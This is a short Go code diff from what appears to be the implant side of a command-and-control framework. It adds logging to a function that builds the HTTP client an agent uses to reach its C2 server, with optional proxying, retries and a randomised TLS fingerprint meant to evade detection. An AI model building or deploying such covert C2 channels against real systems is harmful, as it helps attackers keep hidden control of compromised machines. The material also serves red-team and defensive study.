@@ -42,11 +42,12 @@ func EmpHTTPClient(c2_addr, proxyServer string) *http.Client {
 
 	// fingerprint of CA
 	ca_crt, _ := ParsePem(CACrt)
-	log.Printf("CA cert fingerprint: %s", SHA256SumRaw(ca_crt.Raw))
+	log.Printf("CA cert fingerprint: %s, now making proxy dialer", SHA256SumRaw(ca_crt.Raw))
 
 	// set proxyURL to nil to use direct connection for C2 transport
 	proxyDialer, _ := makeProxyDialer(nil, config, clientHelloIDMap["hellorandomizedalpn"])
 	if proxyServer != "" {
+		log.Printf("Using proxy server: %s", proxyServer)
 		// use a proxy for our HTTP client
 		proxyUrl, e := url.Parse(proxyServer)
 		if err != nil {
@@ -59,19 +60,21 @@ func EmpHTTPClient(c2_addr, proxyServer string) *http.Client {
 	// transport of our http client, with configured TLS client
 	try := 0
 init_transport:
+	log.Printf("Initializing transport (%s)...", c2url)
 	tr, err := makeTransport(c2url, clientHelloIDMap["hellorandomizedalpn"], config, proxyDialer)
 	try++
 	if err != nil {
 		if proxyServer != "" && try < 5 {
-			util.TakeABlink()
 			log.Printf("Proxy server (%s) down, retrying (%d)...", proxyServer, try)
+			util.TakeASnap()
 			goto init_transport
 		} else {
-			log.Printf("Initializing transport (%s): makeRoundTripper: %v", c2url, err)
+			log.Printf("Error initializing transport (%s): makeRoundTripper: %v", c2url, err)
 			return nil
 		}
 	}
 
+	log.Printf("Transport initialized (%s)", c2url)
 	return &http.Client{Transport: tr}
 }
 
